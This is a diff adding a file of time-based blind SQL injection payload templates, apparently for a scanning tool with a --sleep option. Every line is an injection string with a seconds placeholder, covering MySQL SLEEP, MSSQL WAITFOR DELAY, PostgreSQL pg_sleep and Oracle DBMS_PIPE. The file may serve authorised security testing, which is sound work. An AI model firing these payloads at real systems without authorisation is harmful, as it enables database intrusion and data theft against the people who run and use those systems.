@@ -1,0 +1,14 @@
+# time-based payload templates; %d is replaced with the --sleep seconds.
+' AND SLEEP(%d)-- -
+' OR SLEEP(%d)-- -
+" AND SLEEP(%d)-- -
+' AND (SELECT SLEEP(%d))-- -
+'||(SELECT SLEEP(%d))||'
+ AND SLEEP(%d)
+'; WAITFOR DELAY '0:0:%d'-- -
+' WAITFOR DELAY '0:0:%d'-- -
+' AND (SELECT 1 FROM pg_sleep(%d)) IS NOT NULL-- -
+'||(SELECT pg_sleep(%d))::text||'
+'; SELECT pg_sleep(%d)-- -
+' AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',%d)=1)-- -
+'||dbms_pipe.receive_message(CHR(65),%d)||'
